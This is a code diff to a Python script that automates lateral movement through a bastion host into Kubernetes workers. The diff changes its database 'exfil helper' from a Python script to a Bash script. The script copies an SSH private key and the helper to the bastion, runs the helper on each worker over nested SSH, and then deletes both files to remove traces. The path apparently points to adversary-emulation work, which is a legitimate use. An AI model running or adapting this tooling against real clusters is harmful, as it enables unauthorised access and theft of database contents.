@@ -186,8 +186,8 @@ def fetch_worker_dir(base: list[str], bastion: str, worker_ip: str, dest: Path, 
     return ok
 
 
-def worker_has_python(base: list[str], bastion: str, worker_ip: str) -> bool:
-    nested = f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} 'command -v python3 >/dev/null 2>&1'"
+def worker_has_bash(base: list[str], bastion: str, worker_ip: str) -> bool:
+    nested = f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} 'command -v bash >/dev/null 2>&1'"
     completed = run(
         base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
         capture_output=True,
@@ -198,7 +198,7 @@ def worker_has_python(base: list[str], bastion: str, worker_ip: str) -> bool:
 def run_worker_db_collection(base: list[str], bastion: str, worker_ip: str) -> bool:
     nested = (
         f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} "
-        "'/usr/bin/env python3 - 1' < /tmp/container-admin1.py"
+        "'/usr/bin/env bash /tmp/container-admin1.sh 1'"
     )
     completed = run(
         base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
@@ -241,14 +241,14 @@ def discover_workers(kubeconfig: Path, hosts_file: Path) -> list[tuple[str, str]
 
 
 def upload_worker_helpers(base: list[str], ssh_key: Path, bastion: str) -> bool:
-    helper = Path("/opt/caldera/KC4/container-admin1.py")
+    helper = Path("/opt/caldera/KC4/container-admin1.sh")
     if not helper.is_file():
         print(f"[!] missing optional DB exfil helper {helper}; worker DB collection skipped")
         return False
 
     print("[*] Uploading worker SSH key/script to bastion...")
     scp = scp_opts(ssh_key)
-    first = run(scp + [str(helper), f"{BASTION_USER}@{bastion}:/tmp/container-admin1.py"])
+    first = run(scp + [str(helper), f"{BASTION_USER}@{bastion}:/tmp/container-admin1.sh"])
     second = run(scp + [str(ssh_key), f"{BASTION_USER}@{bastion}:/tmp/key"])
     chmod = run(
         base
@@ -256,7 +256,7 @@ def upload_worker_helpers(base: list[str], ssh_key: Path, bastion: str) -> bool:
             "-p",
             BASTION_PORT,
             f"{BASTION_USER}@{bastion}",
-            "chmod +x /tmp/container-admin1.py && chmod 600 /tmp/key",
+            "chmod +x /tmp/container-admin1.sh && chmod 600 /tmp/key",
         ]
     )
     return first.returncode == 0 and second.returncode == 0 and chmod.returncode == 0
@@ -269,7 +269,7 @@ def cleanup_bastion(base: list[str], bastion: str) -> None:
             "-p",
             BASTION_PORT,
             f"{BASTION_USER}@{bastion}",
-            "rm -f /tmp/key /tmp/container-admin1.py",
+            "rm -f /tmp/key /tmp/container-admin1.sh",
         ],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
@@ -325,8 +325,8 @@ def main() -> int:
 
             if not helpers_uploaded:
                 continue
-            if not worker_has_python(base, control_plane, ip):
-                print(f"[i] worker {ip} has no python3; skipping optional DB exfil script")
+            if not worker_has_bash(base, control_plane, ip):
+                print(f"[i] worker {ip} has no bash; skipping optional DB exfil script")
                 continue
 
             print("Run script in pod")
